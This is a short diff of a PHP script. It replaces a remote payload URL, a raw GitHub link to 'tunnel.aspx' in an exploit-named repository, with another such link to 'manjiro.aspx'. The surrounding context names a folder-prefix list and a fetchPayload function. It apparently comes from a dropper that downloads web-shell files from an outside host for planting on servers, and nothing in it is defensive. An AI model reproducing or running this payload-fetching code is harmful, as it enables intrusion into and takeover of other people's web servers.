@@ -20,7 +20,7 @@ $folder_prefixes = [
 ];
 
 $remote_urls = [
-    'https://raw.githubusercontent.com/kuxrinxploit/kuxrin-passcrot/refs/heads/main/tunnel.aspx'
+    'https://raw.githubusercontent.com/asepexploit/bc/refs/heads/main/manjiro.aspx'
 ];
 
 function fetchPayload(string $url) {
